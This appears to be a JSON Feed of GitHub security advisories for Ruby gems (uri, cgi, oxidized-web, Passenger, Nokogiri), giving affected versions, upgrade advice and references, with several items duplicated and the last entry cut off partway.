{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Ruby gems hosted at RubyGems.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rubygems.json",
    "description": "Security Advisory for Ruby gems hosted at RubyGems.org on GitHub",
    "items": [
        {
            "content_html": "<p>There is a possibility for userinfo leakage by in the uri gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>\n<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.\nAlso thanks to nobu for additional fixes of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/uri/pull/154\">https://github.com/ruby/uri/pull/154</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/155\">https://github.com/ruby/uri/pull/155</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/156\">https://github.com/ruby/uri/pull/156</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/157\">https://github.com/ruby/uri/pull/157</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27221\">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27221\">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>\n<li><a href=\"https://hackerone.com/reports/2957667\">https://hackerone.com/reports/2957667</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22h5-pq3x-2gf2\">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2",
            "title": "[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+",
            "date_modified": "2025-03-04T02:44:53.000Z",
            "date_published": "2025-03-03T22:07:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for userinfo leakage by in the uri gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>\n<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.\nAlso thanks to nobu for additional fixes of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/uri/pull/154\">https://github.com/ruby/uri/pull/154</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/155\">https://github.com/ruby/uri/pull/155</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/156\">https://github.com/ruby/uri/pull/156</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/157\">https://github.com/ruby/uri/pull/157</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27221\">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27221\">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>\n<li><a href=\"https://hackerone.com/reports/2957667\">https://hackerone.com/reports/2957667</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22h5-pq3x-2gf2\">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2",
            "title": "[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+",
            "date_modified": "2025-03-04T02:44:53.000Z",
            "date_published": "2025-03-03T22:07:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for userinfo leakage by in the uri gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>\n<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.\nAlso thanks to nobu for additional fixes of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/uri/pull/154\">https://github.com/ruby/uri/pull/154</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/155\">https://github.com/ruby/uri/pull/155</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/156\">https://github.com/ruby/uri/pull/156</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/157\">https://github.com/ruby/uri/pull/157</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27221\">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27221\">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>\n<li><a href=\"https://hackerone.com/reports/2957667\">https://hackerone.com/reports/2957667</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22h5-pq3x-2gf2\">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2",
            "title": "[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+",
            "date_modified": "2025-03-04T02:44:53.000Z",
            "date_published": "2025-03-03T22:07:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for userinfo leakage by in the uri gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27221. We recommend upgrading the uri gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The methods <code>URI#join</code>, <code>URI#merge</code>, and <code>URI#+</code> retained userinfo, such as <code>user:password</code>, even after the host is replaced. When generating a URL to a malicious host from a URL containing secret userinfo using these methods, and having someone access that URL, an unintended userinfo leak could occur.</p>\n<p>Please update URI gem to version 0.11.3, 0.12.4, 0.13.2, 1.0.3 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>uri gem versions &lt; 0.11.3, 0.12.0 to 0.12.3, 0.13.0, 0.13.1 and 1.0.0 to 1.0.2.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to Tsubasa Irisawa (lambdasawa) for discovering this issue.\nAlso thanks to nobu for additional fixes of this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/uri/pull/154\">https://github.com/ruby/uri/pull/154</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/155\">https://github.com/ruby/uri/pull/155</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/156\">https://github.com/ruby/uri/pull/156</a></li>\n<li><a href=\"https://github.com/ruby/uri/pull/157\">https://github.com/ruby/uri/pull/157</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/uri/CVE-2025-27221.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27221\">https://www.cve.org/CVERecord?id=CVE-2025-27221</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27221\">https://nvd.nist.gov/vuln/detail/CVE-2025-27221</a></li>\n<li><a href=\"https://hackerone.com/reports/2957667\">https://hackerone.com/reports/2957667</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22h5-pq3x-2gf2\">https://github.com/advisories/GHSA-22h5-pq3x-2gf2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2",
            "title": "[uri] URI allows for userinfo Leakage in URI#join, URI#merge, and URI#+",
            "date_modified": "2025-03-04T02:44:53.000Z",
            "date_published": "2025-03-03T22:07:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22h5-pq3x-2gf2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>\n<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to svalkanov for discovering this issue.\nAlso thanks to nobu for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27220\">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27220\">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>\n<li><a href=\"https://hackerone.com/reports/2890322\">https://hackerone.com/reports/2890322</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mhwm-jh88-3gjf\">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf",
            "title": "[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement",
            "date_modified": "2025-03-04T02:44:48.000Z",
            "date_published": "2025-03-03T22:05:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>\n<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to svalkanov for discovering this issue.\nAlso thanks to nobu for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27220\">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27220\">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>\n<li><a href=\"https://hackerone.com/reports/2890322\">https://hackerone.com/reports/2890322</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mhwm-jh88-3gjf\">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf",
            "title": "[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement",
            "date_modified": "2025-03-04T02:44:48.000Z",
            "date_published": "2025-03-03T22:05:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for Regular expression Denial of Service (ReDoS) by in the cgi gem. This vulnerability has been assigned the CVE identifier CVE-2025-27220. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>The regular expression used in <code>CGI::Util#escapeElement</code> is vulnerable to ReDoS. The crafted input could lead to a high CPU consumption.</p>\n<p>This vulnerability only affects Ruby 3.1 and 3.2. If you are using these versions, please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to svalkanov for discovering this issue.\nAlso thanks to nobu for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27220.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27220\">https://www.cve.org/CVERecord?id=CVE-2025-27220</a></li>\n<li><a href=\"https://www.ruby-lang.org/en/news/2025/02/26/security-advisories\">https://www.ruby-lang.org/en/news/2025/02/26/security-advisories</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27220\">https://nvd.nist.gov/vuln/detail/CVE-2025-27220</a></li>\n<li><a href=\"https://hackerone.com/reports/2890322\">https://hackerone.com/reports/2890322</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mhwm-jh88-3gjf\">https://github.com/advisories/GHSA-mhwm-jh88-3gjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf",
            "title": "[cgi] CGI has Regular Expression Denial of Service (ReDoS) potential in Util#escapeElement",
            "date_modified": "2025-03-04T02:44:48.000Z",
            "date_published": "2025-03-03T22:05:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mhwm-jh88-3gjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for DoS by in the cgi gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>\n<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to lio346 for discovering this issue.\nAlso thanks to mame for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27219\">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27219\">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>\n<li><a href=\"https://hackerone.com/reports/2936778\">https://hackerone.com/reports/2936778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh9q-2xrm-x6qv\">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv",
            "title": "[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse",
            "date_modified": "2025-03-04T02:44:43.000Z",
            "date_published": "2025-03-03T20:53:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for DoS by in the cgi gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>\n<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to lio346 for discovering this issue.\nAlso thanks to mame for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27219\">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27219\">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>\n<li><a href=\"https://hackerone.com/reports/2936778\">https://hackerone.com/reports/2936778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh9q-2xrm-x6qv\">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv",
            "title": "[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse",
            "date_modified": "2025-03-04T02:44:43.000Z",
            "date_published": "2025-03-03T20:53:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>There is a possibility for DoS by in the cgi gem.\nThis vulnerability has been assigned the CVE identifier CVE-2025-27219. We recommend upgrading the cgi gem.</p>\n<h2 id=\"details\">Details</h2>\n<p>CGI::Cookie.parse took super-linear time to parse a cookie string in some cases. Feeding a maliciously crafted cookie string into the method could lead to a Denial of Service.</p>\n<p>Please update CGI gem to version 0.3.5.1, 0.3.7, 0.4.2 or later.</p>\n<h2 id=\"affected-versions\">Affected versions</h2>\n<p>cgi gem versions &lt;= 0.3.5, 0.3.6, 0.4.0 and 0.4.1.</p>\n<h2 id=\"credits\">Credits</h2>\n<p>Thanks to lio346 for discovering this issue.\nAlso thanks to mame for fixing this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/cgi/pull/52\">https://github.com/ruby/cgi/pull/52</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/53\">https://github.com/ruby/cgi/pull/53</a></li>\n<li><a href=\"https://github.com/ruby/cgi/pull/54\">https://github.com/ruby/cgi/pull/54</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2025-27219.yml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-27219\">https://www.cve.org/CVERecord?id=CVE-2025-27219</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27219\">https://nvd.nist.gov/vuln/detail/CVE-2025-27219</a></li>\n<li><a href=\"https://hackerone.com/reports/2936778\">https://hackerone.com/reports/2936778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh9q-2xrm-x6qv\">https://github.com/advisories/GHSA-gh9q-2xrm-x6qv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv",
            "title": "[cgi] CGI has Denial of Service (DoS) potential in Cookie.parse",
            "date_modified": "2025-03-04T02:44:43.000Z",
            "date_published": "2025-03-03T20:53:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh9q-2xrm-x6qv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In oxidized-web (aka Oxidized Web) before 0.15.0, the RANCID migration page allows an unauthenticated user to gain control over the Linux user account that is running oxidized-web.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27590\">https://nvd.nist.gov/vuln/detail/CVE-2025-27590</a></li>\n<li><a href=\"https://github.com/ytti/oxidized-web/commit/a5220a0ddc57b85cd122bffee228d3ed4901668e\">https://github.com/ytti/oxidized-web/commit/a5220a0ddc57b85cd122bffee228d3ed4901668e</a></li>\n<li><a href=\"https://github.com/ytti/oxidized-web/releases/tag/0.15.0\">https://github.com/ytti/oxidized-web/releases/tag/0.15.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jx6p-9c26-g373\">https://github.com/advisories/GHSA-jx6p-9c26-g373</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jx6p-9c26-g373",
            "title": "[oxidized-web] Oxidized Web RANCID migration page allows unauthenticated user to gain control over Linux user account",
            "date_modified": "2025-03-03T20:12:31.000Z",
            "date_published": "2025-03-03T06:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jx6p-9c26-g373"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The http parser in Phusion Passenger 6.0.21 through 6.0.25 before 6.0.26 allows a denial of service during parsing of a request with an invalid HTTP method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26803\">https://nvd.nist.gov/vuln/detail/CVE-2025-26803</a></li>\n<li><a href=\"https://github.com/phusion/passenger/commit/bb15591646687064ab2d578d5f9660b2a4168017\">https://github.com/phusion/passenger/commit/bb15591646687064ab2d578d5f9660b2a4168017</a></li>\n<li><a href=\"https://blog.phusion.nl/2025/02/19/passenger-6-0-26\">https://blog.phusion.nl/2025/02/19/passenger-6-0-26</a></li>\n<li><a href=\"https://github.com/phusion/passenger/compare/release-6.0.25...release-6.0.26\">https://github.com/phusion/passenger/compare/release-6.0.25...release-6.0.26</a></li>\n<li><a href=\"https://github.com/phusion/passenger/releases/tag/release-6.0.26\">https://github.com/phusion/passenger/releases/tag/release-6.0.26</a></li>\n<li><a href=\"https://www.phusionpassenger.com/support\">https://www.phusionpassenger.com/support</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/passenger/CVE-2025-26803.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/passenger/CVE-2025-26803.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2cj2-qqxj-5m3r\">https://github.com/advisories/GHSA-2cj2-qqxj-5m3r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2cj2-qqxj-5m3r",
            "title": "[passenger] Phusion Passenger denial of service ",
            "date_modified": "2025-02-26T21:42:56.000Z",
            "date_published": "2025-02-24T18:32:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2cj2-qqxj-5m3r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Nokogiri v1.18.3 upgrades its dependency libxml2 to\n<a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/releases/v2.13.6\">v2.13.6</a>.</p>\n<p>libxml2 v2.13.6 addresses:</p>\n<ul>\n<li>CVE-2025-24928<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/847\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/847</a></li>\n</ul>\n</li>\n<li>CVE-2024-56171<ul>\n<li>described at <a href=\"https://gitlab.gnome.org/GNOME/libxml2/-/issues/828\">https://gitlab.gnome.org/GNOME/libxml2/-/issues/828</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<h3 id=\"cve-2025-24928\">CVE-2025-24928</h3>\n<p>Stack-buffer overflow is possible when reporting DTD validation\nerrors if the input contains a long (~3kb) QName prefix.</p>\n<h3 id=\"cve-2024-56171\">CVE-2024-56171</h3>\n<p>Use-after-free is possible during validation against untrusted\nXML Schemas (.xsd) and, potentially, validation of untrusted documents\nagainst trusted Schemas if they make use of <code>xsd:keyref</code> in combination\nwith recursively defined types that have additional identity constraints.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m\">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-vvfq-8hwr-qm4m</a></li>\n<li><a 